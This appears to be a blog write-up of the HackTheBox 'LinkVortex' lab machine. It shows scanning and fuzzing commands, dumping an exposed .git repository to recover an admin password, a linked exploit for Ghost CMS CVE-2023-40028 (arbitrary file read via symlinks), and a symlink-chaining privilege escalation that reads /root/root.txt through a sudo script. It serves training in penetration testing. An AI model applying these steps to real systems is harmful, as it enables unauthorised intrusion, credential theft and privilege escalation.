---
title: HackTheBox LinkVortex Writeup
authors: Samarth
date: 2024-12-15 09:30:00 +0530
categories: [HackTheBox Machines]
tags: [Linux, Ghost CMS, CVE-2023-40028]
math: true
mermaid: true
---

![LinkVortex - HTB](/assets/images/writeups/LinkVortex-HTB/banner.png)

## TL;DR

This writeup is based on the [__LinkVortex__](https://app.hackthebox.com/machines/LinkVortex){:target="_blank"} machine, which is an easy-rated Linux box on Hack the Box. I began by scanning the target and found open ports for SSH and HTTP. After enumerating the web server, I discovered it was running the Ghost CMS. Through subdomain enumeration, I found a `dev.linkvortex.htb` subdomain and performed directory fuzzing, which led to the discovery of a `.git` directory. Using the `git-dumper` tool, I successfully dumped the repository and found admin credentials in a file. With these credentials, I accessed the Ghost CMS admin panel and identified a vulnerability (CVE-2023-40028) that allowed me to exploit arbitrary file read via symlinks. This led to discovering a configuration file with the `bob` user’s SSH credentials, which I used to log in and capture the user flag. I then used a script (`clean_symlink.sh`) to escalate privileges, ultimately gaining root access and capturing the root flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 22 and 80, corresponding to `SSH` and `Apache httpd`. Here are the results from Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.47 -oN scan/normal.scan     

Starting Nmap 7.94 ( https://nmap.org ) at 2024-12-17 19:12 IST
Nmap scan report for 10.10.11.47
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Two services, SSH and HTTP, were detected. Let’s proceed with enumerating the HTTP service.

## Enumeration

The Nmap scan revealed that the IP address is linked to the domain name `linkvortex.htb`. Therefore, we need to add this domain to the `"/etc/hosts"` file.

Then, I visited `http://linkvortex.htb/`.

![Browser View](/assets/images/writeups/LinkVortex-HTB/1.png)

Using `whatweb` web application technology analyzer, I found that the website uses `Ghost` CMS. `Ghost` CMS is running `5.58` version.

```bash
whatweb -v http://linkvortex.htb/                                           
WhatWeb report for http://linkvortex.htb/
Status    : 200 OK
Title     : BitByBit Hardware
IP        : 10.10.11.47
Country   : RESERVED, ZZ

Summary   : Apache, HTML5, HTTPServer[Apache], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], X-Powered-By[Express], X-UA-Compatible[IE=edge]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	String       : Apache (from server string)

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse 
	HTML documents, handle events, perform animations, and add 
	AJAX. 

	Version      : 3.5.1
	Website     : http://jquery.com/

[ MetaGenerator ]
	This plugin identifies meta generator tags and extracts its 
	value. 

	String       : Ghost 5.58
```

`Ghost` is an open source content management system platform written in JavaScript and distributed under the MIT License, designed to simplify the process of online publishing for individual bloggers as well as online publications. 

While performing directory listing on `http://linkvortex.htb`, I didn't find anything interesting.

### Subdomain Enumeration

Before browsing further, I started subdomain enumeration for `linkvortex.htb`.

I found one subdomain `dev.linkvortex.htb` during subdomain enumeration. Let's add this subdomain to `/etc/hosts` file.

```bash
wfuzz -c -f subdomains.txt -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://linkvortex.htb' -H "Host:FUZZ.linkvortex.htb" --hc 301

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://linkvortex.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================
000000019:   200        115 L    255 W      2538 Ch     "dev"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Then, I visited `http://dev.linkvortex.htb`.

![Dev subdomain](/assets/images/writeups/LinkVortex-HTB/2.png)

This website didn't show any relevant information.

Let's perform directory fuzzing on `http://dev.linkvortex.htb` to discover files and directories.

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://dev.linkvortex.htb/FUZZ --hc 404,403 -f dev.linkvortex.fuzzing
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.linkvortex.htb/FUZZ
Total requests: 20476

=====================================================================
ID           Response   Lines    Word       Chars      Payload 
=====================================================================

000000014:   301        7 L      20 W       239 Ch     ".git"                           

Total time: 0
Processed Requests: 20476
Filtered Requests: 20475
Requests/sec.: 0
```

I found one interesting directory that is `.git`. Let's visit `http://dev.linkvortex.htb/.git`.

![.git directory](/assets/images/writeups/LinkVortex-HTB/3.png)

While Googling for some time to see how I could make use of `.git` directory to find interesting information. I came across a tool called `git-dumper`. 

[__`git-dumper`__](https://github.com/arthaud/git-dumper){:target="_blank"} - A tool to dump a git repository from a website.

It requires the url and the output directory. Let'	s utilise this tool.

```bash
python3 git_dumper.py http://dev.linkvortex.htb/.git ~/dev_linkvortex_git_dump

[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
```

I successfully dumped the git repository. Let’s check the output directory to find something interesting.

While browsing through each of the files and directories, I discovered that this could be the configuration of the `Ghost` CMS. So, I used the `find` method to check if any authentication files existed.

```bash
 find . -iname '*authentication*' 

./ghost/admin/mirage/config/authentication.js
./ghost/admin/tests/acceptance/authentication-test.js
./ghost/core/test/e2e-api/admin/key-authentication.test.js
./ghost/core/test/e2e-api/content/key_authentication.test.js
./ghost/core/test/regression/api/admin/__snapshots__/authentication.test.js.snap
./ghost/core/test/regression/api/admin/authentication.test.js
./ghost/core/core/server/api/endpoints/authentication.js
./ghost/core/core/server/api/endpoints/utils/serializers/output/authentication.js
```

I came across multiple authentication.js. While reading through them, I found some credentials that seemed to belong to an administrator user.

```bash
cat ghost/core/test/regression/api/admin/authentication.test.js | grep pass

            const password = 'OctopiFociPilfer45';
                        password,
            await agent.loginAs(email, password);
                        password: 'thisissupersafe',
                        password: 'thisissupersafe',
            const password = 'thisissupersafe';
                        password,
            await cleanAgent.loginAs(email, password);
                        password: 'lel123456',
                        password: '12345678910',
                        password: '12345678910',
```
In the above `authentication.test.js` file, I found password that is `OctopiFociPilfer45`.

I found the password, but now I needed to locate the login panel for the admin. I think I hadn't checked for the `robots.txt` file yet. Let's check `robots.txt` to find some information.

![Robots.txt](/assets/images/writeups/LinkVortex-HTB/4.png)

`robots.txt` revealed some directories marked as `disallow`, but `/ghost` seemed  interesting, especially since I had already found credentials.

Let's visit `http://linkvortex.htb/ghost` and see if we can access it.

## Exploitation

![Ghost Admin Panel](/assets/images/writeups/LinkVortex-HTB/5.png)

I successfully found the login panel. Let's use the combination of admin mail and the password I found.

```bash
Username - admin@linkvortex.htb
Password - OctopiFociPilfer45
```
I have successfully logged into Ghost Dashboard.

![Ghost Dashboard](/assets/images/writeups/LinkVortex-HTB/6.png)

Now that I have valid credentials for the admin user and know that `Ghost 5.58` version is running on the system, I used this information to check if any vulnerability existed in this version.

I came across `CVE-2023-40028`, which is responsible for arbitrary file read.

[__`CVE-2023-40028`__](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028){:target="_blank"} affects Ghost, an open source content management system, where versions prior to 5.59.1 allow authenticated users to upload files that are symlinks. This can be exploited to perform an arbitrary file read of any file on the host operating system.

Let's understand the vulnerability -

1. `Ghost CMS API` (`/ghost/api/v3/admin`) allows an attacker to log in with valid credentials and provide access to upload a `symlink` file to the web server.

2. `Symlink` - A symlink is a type of file that points to another file or directory in a file system. It acts as a shortcut or reference, allowing access to files or directories in different locations on the system without having to move or copy the actual data.

3. Once the attacker uploads a `symlink` file, improper input validation checks in the upload functionality allow the attacker to perform arbitrary file read operations.

I used the public [__exploit__](https://github.com/0xyassine/CVE-2023-40028){:target="_blank"}.

Make sure to modify `GHOST_URL` value to `http://linkvortex.htb` in the script before executing it.

![Arbitrary File Read](/assets/images/writeups/LinkVortex-HTB/7.png)

I was successfully able to perform arbitrary file read and read the content of `/etc/passwd`.

While browsing the `.git` dump, I came across a file named `Dockerfile.ghost`, which contains configuration file for production. Let's check the file path of the configuration file.

![Dockerfile.ghost](/assets/images/writeups/LinkVortex-HTB/8.png)

I obtained the file path. Let's use arbitrary file read vulnerability to read the content.

![Configuration file](/assets/images/writeups/LinkVortex-HTB/9.png)

Surprisingly, I found user credential for the `bob` user. Let's use these credential to log in via SSH, as the port is open.

![User Access](/assets/images/writeups/LinkVortex-HTB/10.png)

Success! I logged in as the bob user and obtained the user flag.

## Post Exploitation

Let's run `sudo -l` to check which list of commands that the current user can run with elevated privileges using `sudo`.

![sudo -l](/assets/images/writeups/LinkVortex-HTB/11.png)

I first read the `clean_symlink.sh` file to understand what the script does.

The script is designed to check if a file (passed as an argument) is a symbolic link pointing to a PNG file. If it is, it checks the target of the symbolic link and decides whether to remove it or quarantine it. Specifically, if the symbolic link points to sensitive files or directories (like `/etc` or `/root`), it removes the link. Otherwise, it quarantines the link in a designated directory (/var/quarantined). It may also print the content of the quarantined file if the `CHECK_CONTENT` variable is set to `true`.

![clean_symlink.sh](/assets/images/writeups/LinkVortex-HTB/12.png)

I created two symlinks using the `ln` command. The `ln` command in Linux is used to create links to files and directories. According to the script, the content of the quarantined file was only printed if the `CHECK_CONTENT` variable was set to `true`.

```bash
export CHECK_CONTENT=true
```

After collecting all the information, I created two symlinks.

```bash
touch link1.png
`ln -sf /root/root.txt link1.png`
touch link2.png
`ln -sf /home/bob/link1.png link2.png`
```

In the first symlink, `link1.png` is points to `/root/root.txt`.
In the second symlink, the `link1.png` was stored at `/home/bob`, so I used `link2.png`, which pointed to `/home/bob/link1.png`.

I used `link2.png` for the `clean_symlink.sh` script because it would consider `/home/bob/link1.png` as the valid symlink.

```bash
sudo bash /opt/ghost/clean_symlink.sh link2.png
```

![Root Flag](/assets/images/writeups/LinkVortex-HTB/13.png)


![Pwned](/assets/images/writeups/LinkVortex-HTB/Pwned.png)


Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.